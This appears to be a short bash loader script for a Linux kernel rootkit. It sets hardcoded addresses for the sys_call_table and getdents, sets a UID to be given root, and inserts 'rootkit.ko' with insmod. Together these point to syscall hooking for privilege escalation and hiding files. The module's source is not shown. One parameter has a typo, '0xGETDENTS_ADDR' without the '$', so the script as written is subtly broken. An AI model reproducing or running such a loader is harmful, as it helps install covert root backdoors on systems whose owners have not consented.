#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map
TABLE_ADDR=ffffffff81801300
ROOT_UID=10035
GETDENTS_ADDR=ffffffff8118a430

#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR root_uid=$ROOT_UID getdents_addr=0xGETDENTS_ADDR
